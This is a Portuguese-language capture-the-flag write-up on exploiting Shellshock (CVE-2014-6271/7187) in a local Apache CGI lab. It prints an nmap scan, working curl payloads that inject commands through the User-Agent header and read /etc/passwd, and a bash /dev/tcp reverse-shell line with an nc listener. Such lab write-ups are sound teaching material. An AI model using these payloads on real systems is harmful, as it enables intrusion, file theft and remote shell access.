## vulnerabilidade baseada na CVE base CVE-2014-6271 (variante CVE-2014-7187)
- pasta ftp: https://ftp.gnu.org/gnu/bash/

### explicao / variantes e fontes:
- https://nvd.nist.gov/vuln/detail/cve-2014-7187
- https://www.cve.org/CVERecord?id=CVE-2014-6271
- https://en.wikipedia.org/wiki/Shellshock_(software_bug)#References
- https://hub.docker.com/r/vulnerables/cve-2014-6271

### write-up
Shellshock também conhecido como Bashdoor (CVE-2014-6271 e CVE-2014-7169), é uma falha de segurança no Bash shell em sistemas Unix-like, que foi divulgada em 24 de setembro de 2014

A maquina roda um servidor de Apache com uma versão antiga do bash de 10 anos atrás, isso pode ser verficado enviando um payload http para a máquina que explora a vulnerabilidade shellshock

```pwsh
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 17:14 E. South America Standard Time
Nmap scan report for localhost (127.0.0.1)
Host is up (0.020s latency).
Other addresses for localhost (not scanned): ::1
rDNS record for 127.0.0.1: kubernetes.docker.internal

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-open-proxy: Proxy might be redirecting requests
|_http-generator: vi2html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.57 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1809 - 2004
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds

PS C:\Users\Arthur> curl -H "user-agent: () { :; }; echo; /bin/bash -c 'bash --version'" 127.0.0.1:8080/cgi-bin/stats
GNU bash, version 4.3.0(1)-rc1 (x86_64-pc-linux-gnu)
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>

This is free software; you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
```
```pwsh
PS C:\Users\Arthur\Documents\CTF-SECOMP-UFSCar-2023\pwn\chall-0-easy> curl -H "user-agent: () { :; }; echo; /bin/bash -c 'cat /etc/passwd;'" 127.0.0.1:8080/cgi-bin/stats
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
Para facilitar é possível criar um reverse shell entre a máquina alvo e a máquina que realiza o ataque: \
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

na máquina alvo:
```sh
bash -i >& /dev/tcp/<ip-gw>/6969 0>&1
#curl -H "user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/<ip-gw>/6969 0>&1;'" 127.0.0.1:8080/cgi-bin/stats
```
na máquina atacante:
```sh
nc -lvp 6969
```